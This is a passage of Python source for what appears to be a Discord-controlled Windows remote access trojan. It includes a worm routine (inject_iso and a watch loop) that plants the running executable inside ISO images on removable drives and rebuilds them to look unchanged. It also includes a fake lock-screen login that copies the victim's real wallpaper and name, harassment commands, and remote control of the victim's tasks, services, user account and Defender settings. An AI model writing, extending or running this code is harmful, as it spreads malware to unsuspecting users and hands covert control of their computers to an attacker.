            l.TextAlign = ContentAlignment.MiddleCenter;
            l.ForeColor = Color.White;
            l.BackColor = Color.Transparent;
            l.Location = new Point(gx, ch - 62);
            bg.Controls.Add(l);
            gx += 40;
        }

        spin = new Timer();
        spin.Interval = 90;
        string[] frames = { "◐", "◓", "◑", "◒" };
        spin.Tick += delegate { spinner.Text = frames[sf++ % 4]; };

        EventHandler submit = delegate
        {
            box.Clear();
            box.Visible = false;
            hint.Text = "Welcome";
            spinner.Visible = true;
            sf = 0;
            spin.Start();
            var t2 = new Timer();
            t2.Interval = 2200;
            t2.Tick += delegate
            {
                t2.Stop();
                spin.Stop();
                spinner.Visible = false;
                fails++;
                if (fails >= 3)
                {
                    hint.Text = "The password is incorrect. (Simulation · Esc to exit)";
                    return;
                }
                hint.Text = "The password is incorrect. Try again.";
                box.Visible = true;
                box.Focus();
            };
            t2.Start();
        };

        box.KeyDown += delegate (object s, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter) { e.SuppressKeyPress = true; submit(null, null); }
            if (e.KeyCode == Keys.Escape) Application.ExitThread();
        };
        panel.Click += delegate { box.Focus(); };
        go.Click += submit;
        main.Click += delegate { box.Focus(); };

        var close = new Timer();
        close.Interval = Math.Max(2000, ms);
        close.Tick += delegate { foreach (var w in walls) w.Close(); main.Close(); close.Stop(); Application.ExitThread(); };
        close.Start();

        main.Show();
        box.Focus();
        Application.Run();
    }
}
"""

def _fl_ps1():
    try:
        if os.path.exists(_FL_PS1) and os.path.getsize(_FL_PS1) > 3000:
            return _FL_PS1
        with open(_FL_PS1, "w", encoding="utf-8") as f:
            f.write("Add-Type -AssemblyName System.Drawing,System.Windows.Forms\n")
            f.write("$src = @'\n" + _FL_SRC + "\n'@\n")
            f.write("Add-Type -TypeDefinition $src -ReferencedAssemblies System.Drawing,System.Windows.Forms\n")
            f.write("[LmFl]::Run([int]$env:LM_MS)\n")
        return _FL_PS1
    except Exception:
        return None

@bot.command(name="fakelogin", aliases=["login-fake", "lockfake"])
async def fakelogin(ctx, secs: int = 90):
    p = _fl_ps1()
    if not p:
        return await ctx.send(embed=create_embed("🔐 Fake login", "The helper script could not be written to the disk.", 0xff4444))
    subprocess.Popen(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", p],
                     creationflags=_CNW, stdin=subprocess.DEVNULL,
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                     env=dict(os.environ, LM_MS=str(max(10, secs) * 1000)))
    await ctx.send(embed=create_embed("🔐 Fake login",
                                      "A replica of the lock screen with the real wallpaper, avatar and user name was opened on every display for **{}** seconds.".format(secs),
                                      0x00aaff))

ISO_WATCH = True
_ISO_SEEN = set()
_ISO_LOCK = threading.Lock()
_JUNK = (".crdownload", ".part", ".tmp", ".aria2", ".!ut", ".downloading", ".opdownload", ".bak")
_PREFER = ("setup", "install", "soft", "program", "tool", "util", "crack", "keygen",
           "patch", "portable", "app", "extra", "instalador", "programas")
_SKIP_DIRS = ("sources", "boot", "efi", "support", "$recycle.bin",
              "system volume information", "autorun")


def _removable_roots():
    out = []
    try:
        for p in psutil.disk_partitions(all=False):
            opts = (p.opts or "").lower()
            if "removable" in opts or (p.fstype or "").lower() in ("fat32", "exfat"):
                out.append(p.mountpoint.rstrip("\\/"))
    except Exception:
        pass
    return out


def _find_tool(names):
    bases = [b for b in os.environ.get("PATH", "").split(";") if b.strip()]
    bases += [
        r"C:\Program Files (x86)\Windows Kits\10\Assessment and Deployment Kit\Deployment Tools\amd64\Oscdimg",
        r"C:\Program Files (x86)\Windows Kits\10\Assessment and Deployment Kit\Deployment Tools\x86\Oscdimg",
        r"C:\Program Files\Windows Kits\10\Assessment and Deployment Kit\Deployment Tools\amd64\Oscdimg",
        r"C:\Program Files\7-Zip", r"C:\Program Files (x86)\7-Zip",
    ]
    for b in bases:
        for n in names:
            p = os.path.join(b.strip(), n)
            if os.path.isfile(p):
                return p
    return None


def _iso_mount(path):
    r = _ps("$i = Mount-DiskImage -ImagePath '{}' -PassThru -ErrorAction Stop; "
            "($i | Get-Volume).DriveLetter".format(path.replace("'", "''")))
    line = (r.stdout or "").strip().splitlines() if r else []
    letter = line[0].strip() if line else ""
    return (letter + ":") if letter else None


def _iso_unmount(path):
    _ps("Dismount-DiskImage -ImagePath '{}' -ErrorAction SilentlyContinue".format(
        path.replace("'", "''")))


def _iso_label(path):
    r = _ps("(Get-DiskImage -ImagePath '{}' | Get-Volume).FileSystemLabel".format(
        path.replace("'", "''")))
    lbl = ((r.stdout or "").strip().splitlines() or [""])[0].strip()
    return re.sub(r"[^A-Za-z0-9_\-]", "", lbl)[:32] or "DATA"


def _iso_target(root):
    cands = []
    try:
        for name in sorted(os.listdir(root)):
            full = os.path.join(root, name)
            if not os.path.isdir(full):
                continue
            if name.lower() in _SKIP_DIRS:
                continue
            cands.append((name, full))
    except Exception:
        return root

    clean = []
    for name, full in cands:
        try:
            files = os.listdir(full)
        except Exception:
            continue
        if any(f.lower().endswith(_JUNK) for f in files):
            continue
        clean.append((name, full))

    for name, full in clean:
        if any(k in name.lower() for k in _PREFER):
            return full
    if clean:
        return clean[0][1]
    return root


def _iso_rebuild(src, out, label, boot_img=None, efi_img=None):
    oscdimg = _find_tool(["oscdimg.exe"])
    if oscdimg:
        cmd = [oscdimg, "-m", "-o", "-u2", "-udfver102", "-l" + label]
        if boot_img and efi_img and os.path.exists(boot_img) and os.path.exists(efi_img):
            cmd += ["-bootdata:2#p0,e,b{}#pEF,e,b{}".format(boot_img, efi_img)]
        elif boot_img and os.path.exists(boot_img):
            cmd += ["-b{}".format(boot_img)]
        cmd += [src, out]
        r = subprocess.run(cmd, capture_output=True, creationflags=_CNW, timeout=1800)
        if r.returncode == 0 and os.path.exists(out) and os.path.getsize(out) > 1 << 20:
            return "oscdimg"

    sevenzip = _find_tool(["7z.exe", "7za.exe"])
    if sevenzip:
        r = subprocess.run([sevenzip, "a", "-tiso", "-mx1", "-y", out,
                            os.path.join(src, "*")],
                           capture_output=True, creationflags=_CNW, timeout=1800)
        if r.returncode == 0 and os.path.exists(out) and os.path.getsize(out) > 1 << 20:
            return "7z"

    ps = r'''
$src = '@SRC@'; $out = '@OUT@'; $lbl = '@LBL@'
$fsi = New-Object -ComObject IMAPI2FS.MsftFileSystemImage
$fsi.FileSystemsToCreate = 3
$fsi.VolumeName = $lbl
$fsi.Root.AddTree($src, $false)
$img = $fsi.CreateResultImage()
$is = [System.Runtime.InteropServices.ComTypes.IStream]$img.ImageStream
$fs = New-Object System.IO.FileStream($out, [System.IO.FileMode]::Create)
$buf = New-Object byte[] 65536
$read = 0
do {
  $is.Read([ref]$buf[0], 65536, [ref]$read)
  if ($read -gt 0) { $fs.Write($buf, 0, $read) }
} while ($read -gt 0)
$fs.Close()
'''.replace("@SRC@", src.replace("'", "''")).replace("@OUT@", out.replace("'", "''")) \
   .replace("@LBL@", label)
    _ps(ps)
    if os.path.exists(out) and os.path.getsize(out) > 1 << 20:
        return "imapi2"
    return None


def _iso_copy_tree(src, dst):
    for dp, dirs, fs in os.walk(src):
        rel = os.path.relpath(dp, src)
        target = dst if rel == "." else os.path.join(dst, rel)
        os.makedirs(target, exist_ok=True)
        for f in fs:
            try:
                shutil.copy2(os.path.join(dp, f), os.path.join(target, f))
            except Exception:
                pass


def inject_iso(iso, rebuild=True, log=None):
    def _log(m):
        if log:
            log(m)
        _crash("iso", m)

    iso = os.path.abspath(iso)
    if not os.path.isfile(iso):
        return "missing"
    if not _ISO_LOCK.acquire(False):
        return "busy"
    root = None
    tmp = None
    try:
        letter = _iso_mount(iso)
        if not letter:
            return "mount-failed"
        root = letter + "\\"
        me = sys.executable if getattr(sys, "frozen", False) else sys.argv[0]
        name = os.path.basename(me)

        target = _iso_target(root)
        try:
            shutil.copy2(me, os.path.join(target, name))
            _log("copied into {}".format(target))
        except Exception as e:
            _log("copy failed {!r}".format(e))
            return "copy-failed"

        if not rebuild:
            return "copied-only"

        label = _iso_label(iso)
        tmp = os.path.join(tempfile.gettempdir(), "lmiso_" + _rand(8))
        _iso_copy_tree(root, tmp)
        _iso_unmount(iso)
        root = None

        tgt2 = _iso_target(tmp)
        shutil.copy2(me, os.path.join(tgt2, name))

        boot_img = os.path.join(tmp, "boot", "etfsboot.com")
        efi_img = os.path.join(tmp, "efi", "microsoft", "boot", "efisys.bin")
        new = iso + ".new"
        if os.path.exists(new):
            try:
                os.remove(new)
            except Exception:
                pass
        how = _iso_rebuild(tmp, new, label, boot_img, efi_img)
        if not how:
            return "rebuilt-failed"

        bak = iso + ".bak"
        try:
            if os.path.exists(bak):
                os.remove(bak)
            os.rename(iso, bak)
        except Exception:
            pass
        os.replace(new, iso)
        if os.path.getsize(iso) < 1 << 20:
            return "rebuilt-truncated"
        _log("rebuilt with {}".format(how))
        return "ok:" + how
    except Exception as e:
        _log("error {!r}".format(e))
        return "error:{}".format(e)
    finally:
        if root:
            _iso_unmount(iso)
        if tmp:
            shutil.rmtree(tmp, ignore_errors=True)
        try:
            _ISO_LOCK.release()
        except Exception:
            pass

@bot.command(aliases=["inject-iso"])
async def iso(ctx, path: str = None, rebuild: str = "yes"):
    if not path:
        found = [f for r in _removable_roots() for f in glob.glob(os.path.join(r, "*.iso"))]
        await ctx.send(embed=create_embed("💿 ISO", "Usage `.iso <path> [yes|no]`\nFound: " + (", ".join(found) or "none"), 0x0084FF))
        return
    await ctx.message.add_reaction("💿")
    res = await asyncio.to_thread(inject_iso, resolve(path), rebuild.lower() != "no")
    color = 0x00FF00 if res.startswith(("ok", "copied")) else 0xFF0000
    await ctx.send(embed=create_embed("💿 ISO", res, color))

def _iso_watch_loop():
    while True:
        try:
            if ISO_WATCH:
                for root in _removable_roots():
                    for name in glob.glob(os.path.join(root, "*.iso")):
                        key = os.path.abspath(name).lower()
                        if key in _ISO_SEEN:
                            continue
                        _ISO_SEEN.add(key)
                        res = inject_iso(name, True)
                        _crash("iso", "{} -> {}".format(name, res))
        except Exception:
            pass
        time.sleep(25)

async def _sh(ps, timeout=25):
    try:
        p = await asyncio.create_subprocess_exec(
            "powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps,
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
            creationflags=0x08000000)
        out, err = await asyncio.wait_for(p.communicate(), timeout)
        return (out or b"").decode("utf-8", "replace").strip(), (err or b"").decode("utf-8", "replace").strip()
    except asyncio.TimeoutError:
        return "", "timeout"
    except Exception as e:
        return "", str(e)


@bot.command()
async def scream(ctx):
    await _sh("[console]::beep(2400,700);[console]::beep(1800,500);[console]::beep(3000,900)")
    await ctx.send(embed=create_embed("Scream", "Played.", 0x9B59B6))


@bot.command(aliases=["fake-login"])
async def fake_login(ctx):
    ps = r"""
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$f = New-Object Windows.Forms.Form
$f.FormBorderStyle = 'None'; $f.WindowState = 'Maximized'; $f.TopMost = $true
$f.BackColor = '#1f4e79'
$l = New-Object Windows.Forms.Label
$l.Text = 'Sign in to continue'; $l.ForeColor = 'White'
$l.Font = New-Object Drawing.Font('Segoe UI',24); $l.AutoSize = $true
$l.Location = New-Object Drawing.Point(160,220); $f.Controls.Add($l)
$t = New-Object Windows.Forms.TextBox
$t.Size = New-Object Drawing.Size(340,30); $t.Location = New-Object Drawing.Point(160,300)
$f.Controls.Add($t)
$b = New-Object Windows.Forms.Button
$b.Text = 'Sign in'; $b.Size = New-Object Drawing.Size(340,38)
$b.Location = New-Object Drawing.Point(160,345); $f.Controls.Add($b)
$b.Add_Click({ if ($t.Text -ne 'lessmi') { $l.Text = 'Wrong password'; $t.Clear() } })
$f.ShowDialog()
"""
    asyncio.create_task(_sh(ps, 300))
    await ctx.send(embed=create_embed("Fake login", "Fullscreen fake sign-in. Type `lessmi` to unlock.", 0x9B59B6))


@bot.command(aliases=["fake-cmd"])
async def fake_cmd(ctx):
    ps = r"""
$p = Start-Process cmd -ArgumentList '/k','echo LessMi & color 0a' -PassThru
Start-Sleep 1
$w = New-Object -ComObject WScript.Shell
1..40 | % { $w.SendKeys("copy con nul`n"); Start-Sleep -Milliseconds 120 }
"""
    asyncio.create_task(_sh(ps, 120))
    await ctx.send(embed=create_embed("Fake cmd", "Endless command prompt garbage.", 0x9B59B6))


@bot.command(aliases=["fake-error-loop"])
async def fake_error_loop(ctx):
    ps = r"""
Add-Type -AssemblyName System.Windows.Forms
1..8 | % {
  [Windows.Forms.MessageBox]::Show('lessmi.exe has stopped working.','Error','OK','Error') | Out-Null
}
"""
    asyncio.create_task(_sh(ps, 120))
    await ctx.send(embed=create_embed("Error storm", "8 stacked error boxes.", 0xE74C3C))


@bot.command(aliases=["mouse-teleport"])
async def mouse_teleport(ctx):
    ps = r"""
Add-Type -AssemblyName System.Windows.Forms
$r = [Windows.Forms.Screen]::PrimaryScreen.Bounds
1..25 | % {
  [Windows.Forms.Cursor]::Position = New-Object Drawing.Point((Get-Random -Min 0 -Max $r.Width),(Get-Random -Min 0 -Max $r.Height))
  Start-Sleep -Milliseconds 90
}
"""
    asyncio.create_task(_sh(ps, 60))
    await ctx.send(embed=create_embed("Mouse teleport", "Cursor is being thrown around.", 0x9B59B6))


@bot.command(aliases=["typing-ghost"])
async def typing_ghost(ctx, *, text="the quick brown fox jumps over the lazy dog"):
    ps = f"$w=New-Object -ComObject WScript.Shell; Start-Sleep -m 300; $w.SendKeys('{text}')"
    await _sh(ps)
    await ctx.send(embed=create_embed("Typing ghost", f"Typed: `{text}`", 0x9B59B6))


@bot.command(aliases=["folder-storm"])
async def folder_storm(ctx, n: int = 60):
    n = max(1, min(n, 400))
    ps = f"$d=[Environment]::GetFolderPath('Desktop'); 1..{n} | % {{ New-Item -ItemType Directory -Path (Join-Path $d ('lessmi_' + $_)) -Force | Out-Null }}"
    await _sh(ps)
    await ctx.send(embed=create_embed("Folder storm", f"Created **{n}** folders on the desktop.", 0x9B59B6))


@bot.command(aliases=["fake-scan"])
async def fake_scan(ctx):
    ps = r"""
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$f = New-Object Windows.Forms.Form
$f.Size = New-Object Drawing.Size(520,220); $f.Text = 'Windows Security'
$f.BackColor = '#202020'; $f.TopMost = $true
$p = New-Object Windows.Forms.ProgressBar
$p.Size = New-Object Drawing.Size(470,26); $p.Location = New-Object Drawing.Point(20,120)
$f.Controls.Add($p)
$l = New-Object Windows.Forms.Label
$l.Text = 'Scanning C:\ ...'; $l.ForeColor = 'White'
$l.Location = New-Object Drawing.Point(20,70); $l.AutoSize = $true; $f.Controls.Add($l)
$tm = New-Object Windows.Forms.Timer
$tm.Interval = 120
$tm.Add_Tick({ if ($p.Value -ge 99) { $tm.Stop(); $l.Text = 'Scan complete: 14 threats found' } else { $p.Value += 1 } })
$tm.Start()
$f.ShowDialog()
"""
    asyncio.create_task(_sh(ps, 300))
    await ctx.send(embed=create_embed("Fake scan", "Fake antivirus scan that always ends with 14 threats.", 0x9B59B6))


@bot.command(aliases=["rename-user"])
async def rename_user(ctx, *, name="LessMi"):
    ps = f"$u=(Get-CimInstance Win32_ComputerSystem).UserName; Rename-LocalUser -Name ($u -split '\\\\')[-1] -NewName '{name}'"
    out, err = await _sh(ps)
    await ctx.send(embed=create_embed("Rename user", out or err or "Renamed (re-login to see it).", 0x2ECC71))


@bot.command(aliases=["fake-wifi-drop"])
async def fake_wifi_drop(ctx):
    ps = r"""
Add-Type -AssemblyName System.Windows.Forms
[Windows.Forms.MessageBox]::Show('Limited connectivity. Wi-Fi has been disabled by your administrator.','Network','OK','Warning') | Out-Null
"""
    asyncio.create_task(_sh(ps, 60))
    await ctx.send(embed=create_embed("Fake wifi drop", "Sent.", 0x9B59B6))


@bot.command(aliases=["taskbar-move"])
async def taskbar_move(ctx, pos: str = "top"):
    m = {"top": 1, "left": 0, "right": 2, "bottom": 3}.get(pos.lower(), 3)
    ps = f"Set-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3' -Name Settings -Value ((Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3').Settings[0..11] + {m} + (Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3').Settings[13..27])"
    await _sh(ps)
    await _sh("Stop-Process -Name explorer -Force")
    await ctx.send(embed=create_embed("Taskbar move", f"Moved to `{pos}`.", 0x9B59B6))


@bot.command(aliases=["window-stack"])
async def window_stack(ctx, n: int = 12):
    n = max(2, min(n, 30))
    ps = f"""
Add-Type -AssemblyName System.Windows.Forms
1..{n} | % {{
  $f = New-Object Windows.Forms.Form
  $f.Text = 'lessmi'; $f.Size = New-Object Drawing.Size(300,180)
  $f.StartPosition = 'Manual'; $f.Location = New-Object Drawing.Point((Get-Random -Max 700),(Get-Random -Max 500))
  $f.TopMost = $true; $f.Show()
}}
Start-Sleep 30
"""
    asyncio.create_task(_sh(ps, 200))
    await ctx.send(embed=create_embed("Window stack", f"**{n}** fake windows for 30 s.", 0x9B59B6))


@bot.command(aliases=["shutdown-countdown"])
async def shutdown_countdown(ctx, seconds: int = 60):
    ps = f"""
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$f = New-Object Windows.Forms.Form
$f.FormBorderStyle='None'; $f.WindowState='Maximized'; $f.BackColor='#0a3d62'; $f.TopMost=$true
$l = New-Object Windows.Forms.Label
$l.ForeColor='White'; $l.AutoSize=$true; $l.Font=New-Object Drawing.Font('Segoe UI',34)
$l.Location=New-Object Drawing.Point(200,300); $f.Controls.Add($l)
$c = {seconds}
$tm = New-Object Windows.Forms.Timer; $tm.Interval=1000
$tm.Add_Tick({{ $l.Text = "Shutting down in $c seconds..."; $c--; if ($c -lt 0) {{ $tm.Stop(); $f.Close() }} }})
$tm.Start(); $f.ShowDialog()
"""
    asyncio.create_task(_sh(ps, seconds + 40))
    await ctx.send(embed=create_embed("Shutdown countdown", f"{seconds} s fullscreen counter. Nothing actually shuts down.", 0x9B59B6))


@bot.command(aliases=["fake-update"])
async def fake_update(ctx, percent: int = 0):
    start = max(0, min(percent, 99))
    ps = f"""
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$f = New-Object Windows.Forms.Form
$f.FormBorderStyle='None'; $f.WindowState='Maximized'; $f.BackColor='#1b1b1b'; $f.TopMost=$true
$l = New-Object Windows.Forms.Label; $l.ForeColor='White'; $l.AutoSize=$true
$l.Font=New-Object Drawing.Font('Segoe UI',28); $l.Location=New-Object Drawing.Point(240,340)
$f.Controls.Add($l)
$c = {start}
$tm = New-Object Windows.Forms.Timer; $tm.Interval=900
$tm.Add_Tick({{ $l.Text = "Working on updates  $c%  Do not turn off your PC"; $c++; if ($c -gt 99) {{ $c = 30 }} }})
$tm.Start(); $f.ShowDialog()
"""
    asyncio.create_task(_sh(ps, 300))
    await ctx.send(embed=create_embed("Fake update", "Endless update screen looping 30→99 %.", 0x9B59B6))


@bot.command(aliases=["beep-song"])
async def beep_song(ctx):
    notes = [(523,220),(587,220),(659,220),(784,340),(659,220),(784,520)]
    ps = ";".join(f"[console]::beep({f},{d})" for f, d in notes)
    await _sh(ps, 30)
    await ctx.send(embed=create_embed("Beep song", "Played.", 0x9B59B6))


@bot.command(aliases=["random-notify"])
async def random_notify(ctx, n: int = 5):
    n = max(1, min(n, 20))
    ps = f"""
Add-Type -AssemblyName System.Windows.Forms
$t = @('Update ready','Battery low','New device connected','Storage almost full','Restart required')
1..{n} | % {{ [Windows.Forms.MessageBox]::Show(($t | Get-Random),'Windows','OK','Information') | Out-Null }}
"""
    asyncio.create_task(_sh(ps, 120))
    await ctx.send(embed=create_embed("Random notify", f"**{n}** boxes.", 0x9B59B6))


@bot.command(aliases=["fake-printer"])
async def fake_printer(ctx):
    ps = r"""
Add-Type -AssemblyName System.Windows.Forms
[Windows.Forms.MessageBox]::Show('Printer on fire. Check the tray.','Print','OK','Warning') | Out-Null
"""
    asyncio.create_task(_sh(ps, 60))
    await ctx.send(embed=create_embed("Fake printer", "Sent.", 0x9B59B6))


@bot.command(aliases=["fake-disk-full"])
async def fake_disk_full(ctx):
    ps = r"""
Add-Type -AssemblyName System.Windows.Forms
[Windows.Forms.MessageBox]::Show('Low disk space. You are running out of space on Local Disk (C:).','Storage','OK','Warning') | Out-Null
"""
    asyncio.create_task(_sh(ps, 60))
    await ctx.send(embed=create_embed("Fake disk full", "Sent.", 0x9B59B6))


@bot.command(aliases=["caps-spam"])
async def caps_spam(ctx, n: int = 30):
    ps = f"$w=New-Object -ComObject WScript.Shell; 1..{n} | % {{ $w.SendKeys('{{CAPSLOCK}}'); Start-Sleep -m 60 }}"
    await _sh(ps, 40)
    await ctx.send(embed=create_embed("Caps spam", f"Toggled Caps Lock **{n}** times.", 0x9B59B6))


@bot.command(aliases=["cursor-spin"])
async def cursor_spin(ctx, radius: int = 220):
    ps = f"""
Add-Type -AssemblyName System.Windows.Forms
$p = [Windows.Forms.Cursor]::Position
0..360 | % {{
  $a = $_ * [Math]::PI / 180
  [Windows.Forms.Cursor]::Position = New-Object Drawing.Point(($p.X + [Math]::Cos($a)*{radius}),($p.Y + [Math]::Sin($a)*{radius}))
  Start-Sleep -Milliseconds 12
}}
"""
    asyncio.create_task(_sh(ps, 60))
    await ctx.send(embed=create_embed("Cursor spin", f"Spun a **{radius}px** circle.", 0x9B59B6))


@bot.command(aliases=["volume-rave"])
async def volume_rave(ctx, seconds: int = 20):
    ps = f"""
Add-Type -AssemblyName System.Windows.Forms
$end = (Get-Date).AddSeconds({seconds})
while ((Get-Date) -lt $end) {{
  1..2 | % {{ [Windows.Forms.SendKeys]::SendWait([char]175) }}
  1..3 | % {{ [Windows.Forms.SendKeys]::SendWait([char]174) }}
  Start-Sleep -Milliseconds 250
}}
"""
    asyncio.create_task(_sh(ps, seconds + 30))
    await ctx.send(embed=create_embed("Volume rave", f"Volume jumping for {seconds} s.", 0x9B59B6))

@bot.command(aliases=["sys-summary"])
async def sys_summary(ctx):
    ps = ("$c=Get-CimInstance Win32_Processor;$o=Get-CimInstance Win32_OperatingSystem;"
          "'CPU: '+$c.Name;'Cores: '+$c.NumberOfCores;"
          "'RAM free MB: '+[math]::Round($o.FreePhysicalMemory/1024);"
          "'Uptime: '+((Get-Date)-$o.LastBootUpTime).ToString('dd\\.hh\\:mm')")
    out, err = await _sh(ps)
    await ctx.send(embed=create_embed("System summary", out[:1900] or err, 0x2ECC71))


@bot.command(aliases=["cpu-load"])
async def cpu_load(ctx):
    out, err = await _sh("(Get-CimInstance Win32_Processor).LoadPercentage")
    await ctx.send(embed=create_embed("CPU load", f"{out or err} %", 0x2ECC71))




@bot.command(aliases=["disk-health"])
async def disk_health(ctx):
    ps = "Get-PhysicalDisk | Select-Object DeviceId,FriendlyName,MediaType,HealthStatus,OperationalStatus | Format-Table -Auto"
    out, err = await _sh(ps)
    await ctx.send(embed=create_embed("Disk health", f"```\n{out[:1700] or err}\n```", 0x2ECC71))


@bot.command(aliases=["boot-errors"])
async def boot_errors(ctx):
    ps = "Get-WinEvent -FilterHashtable @{LogName='System';Id=41,6008,1001} -MaxEvents 10 | Select TimeCreated,Id,ProviderName | Format-Table -Auto"
    out, err = await _sh(ps)
    await ctx.send(embed=create_embed("Boot errors", f"```\n{out[:1700] or err}\n```", 0xE67E22))


@bot.command(aliases=["bsod-history"])
async def bsod_history(ctx):
    ps = "Get-CimInstance Win32_ReliabilityRecords | Where-Object {$_.SourceName -like '*bugcheck*'} | Select-Object TimeGenerated,ProductName,Message | Format-List"
    out, err = await _sh(ps)
    await ctx.send(embed=create_embed("BSOD history", f"```\n{out[:1700] or err}\n```", 0xE67E22))


@bot.command(aliases=["time-sync"])
async def time_sync(ctx):
    out, err = await _sh("w32tm /resync /force")
    await ctx.send(embed=create_embed("Time sync", out or err, 0x2ECC71))


@bot.command(aliases=["dns-cache"])
async def dns_cache(ctx):
    out, err = await _sh("Get-DnsClientCache | Select-Object Entry,RecordName,Data | Format-Table -Auto")
    await ctx.send(embed=create_embed("DNS cache", f"```\n{out[:1700] or err}\n```", 0x2ECC71))


@bot.command(aliases=["winsock-reset"])
async def winsock_reset(ctx):
    out, err = await _sh("netsh winsock reset; netsh int ip reset")
    await ctx.send(embed=create_embed("Winsock reset", out or err, 0xE67E22))


@bot.command(aliases=["powercfg-report"])
async def powercfg_report(ctx):
    path = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "power.html")
    out, err = await _sh(f"powercfg /energy /output '{path}' /duration 10")
    await ctx.send(embed=create_embed("Energy report", f"Saved to `{path}`.\n{out or err}"[:1900], 0x2ECC71))


@bot.command(aliases=["battery-report"])
async def battery_report(ctx):
    path = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "battery.html")
    out, err = await _sh(f"powercfg /batteryreport /output '{path}'")
    await ctx.send(embed=create_embed("Battery report", f"Saved to `{path}`.\n{out or err}"[:1900], 0x2ECC71))


@bot.command(aliases=["wlan-report"])
async def wlan_report(ctx):
    out, err = await _sh("netsh wlan show interfaces; netsh wlan show profiles")
    await ctx.send(embed=create_embed("WLAN report", f"```\n{out[:1700] or err}\n```", 0x2ECC71))


@bot.command(aliases=["net-pid"])
async def net_pid(ctx):
    ps = "Get-NetTCPConnection | Where-Object State -eq Established | Select LocalPort,RemoteAddress,RemotePort,OwningProcess | Format-Table -Auto"
    out, err = await _sh(ps)
    await ctx.send(embed=create_embed("Connections", f"```\n{out[:1700] or err}\n```", 0x2ECC71))


@bot.command(aliases=["listening-owner"])
async def listening_owner(ctx):
    ps = "Get-NetTCPConnection -State Listen | ForEach-Object { $p=Get-Process -Id $_.OwningProcess -EA 0; \"$($_.LocalPort)  $($p.Name)\" }"
    out, err = await _sh(ps)
    await ctx.send(embed=create_embed("Listening ports", f"```\n{out[:1700] or err}\n```", 0x2ECC71))


@bot.command(aliases=["fw-status"])
async def fw_status(ctx):
    out, err = await _sh("Get-NetFirewallProfile | Select-Object Name,Enabled,DefaultInboundAction | Format-Table -Auto")
    await ctx.send(embed=create_embed("Firewall status", f"```\n{out[:1700] or err}\n```", 0xE67E22))


@bot.command(aliases=["defender-exclusions"])
async def defender_exclusions(ctx):
    out, err = await _sh("(Get-MpPreference).ExclusionPath")
    await ctx.send(embed=create_embed("Defender exclusions", f"```\n{out[:1700] or 'none'}\n```", 0xE67E22))


@bot.command(aliases=["defender-scan"])
async def defender_scan(ctx, path: str = "C:\\"):
    out, err = await _sh(f"Start-MpScan -ScanType CustomScan -ScanPath '{path}'")
    await ctx.send(embed=create_embed("Defender scan", out or err or f"Scanning `{path}`.", 0xE67E22))


@bot.command(aliases=["sched-list"])
async def sched_list(ctx, path: str = "\\"):
    out, err = await _sh(f"Get-ScheduledTask -TaskPath '{path}' | Select-Object TaskName,State | Format-Table -Auto")
    await ctx.send(embed=create_embed("Scheduled tasks", f"```\n{out[:1700] or err}\n```", 0x2ECC71))


@bot.command(aliases=["sched-add"])
async def sched_add(ctx, name: str, time: str, *, command: str):
    ps = (f"$a=New-ScheduledTaskAction -Execute '{command}';"
          f"$t=New-ScheduledTaskTrigger -At '{time}';"
          f"Register-ScheduledTask -TaskName '{name}' -Action $a -Trigger $t -Force | Out-Null")
    out, err = await _sh(ps)
    await ctx.send(embed=create_embed("Task created", out or err or f"`{name}` at `{time}`.", 0x2ECC71))


@bot.command(aliases=["sched-del"])
async def sched_del(ctx, name: str):
    out, err = await _sh(f"Unregister-ScheduledTask -TaskName '{name}' -Confirm:$false")
    await ctx.send(embed=create_embed("Task deleted", out or err or name, 0xE74C3C))


@bot.command(aliases=["svc-status"])
async def svc_status(ctx, name: str):
    out, err = await _sh(f"Get-Service -Name '{name}' | Select-Object Name,Status,StartType | Format-List")
    await ctx.send(embed=create_embed("Service", f"```\n{out[:1700] or err}\n```", 0x2ECC71))


@bot.command(aliases=["svc-start", "svc-stop", "svc-restart"])
async def svc_ctl(ctx, name: str, action: str = "restart"):
    act = action.lower()
    cmd = {"start": f"Start-Service '{name}'", "stop": f"Stop-Service '{name}' -Force",
           "restart": f"Restart-Service '{name}' -Force"}.get(act, f"Restart-Service '{name}' -Force")
    out, err = await _sh(cmd)
    await ctx.send(embed=create_embed(f"Service {act}", out or err or name, 0x2ECC71))


@bot.command(aliases=["env-path"])
async def env_path(ctx):
    out, err = await _sh("[Environment]::GetEnvironmentVariable('Path','Machine')")
    await ctx.send(embed=create_embed("PATH", f"```\n{out[:1700] or err}\n```", 0x2ECC71))


@bot.command(aliases=["path-add"])
async def path_add(ctx, *, directory: str):
    ps = (f"$p=[Environment]::GetEnvironmentVariable('Path','Machine');"
          f"if ($p -notlike '*{directory}*') {{ [Environment]::SetEnvironmentVariable('Path', $p + ';{directory}', 'Machine') }}")
    out, err = await _sh(ps)
    await ctx.send(embed=create_embed("PATH updated", out or err or directory, 0x2ECC71))


@bot.command(aliases=["hostname-set"])
async def hostname_set(ctx, *, name: str):
    out, err = await _sh(f"Rename-Computer -NewName '{name}' -Force")
    await ctx.send(embed=create_embed("Hostname", out or err or f"Renamed to `{name}` (reboot needed).", 0x2ECC71))


@bot.command(aliases=["proxy-off"])
async def proxy_off(ctx):
    out, err = await _sh("netsh winhttp reset proxy; Set-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name ProxyEnable -Value 0")
    await ctx.send(embed=create_embed("Proxy disabled", out or err or "Done.", 0x2ECC71))


@bot.command(aliases=["dpi-info"])
async def dpi_info(ctx):
    ps = "Get-ItemProperty 'HKCU:\\Control Panel\\Desktop' | Select-Object LogPixels,Win8DpiScaling | Format-List"
    out, err = await _sh(ps)
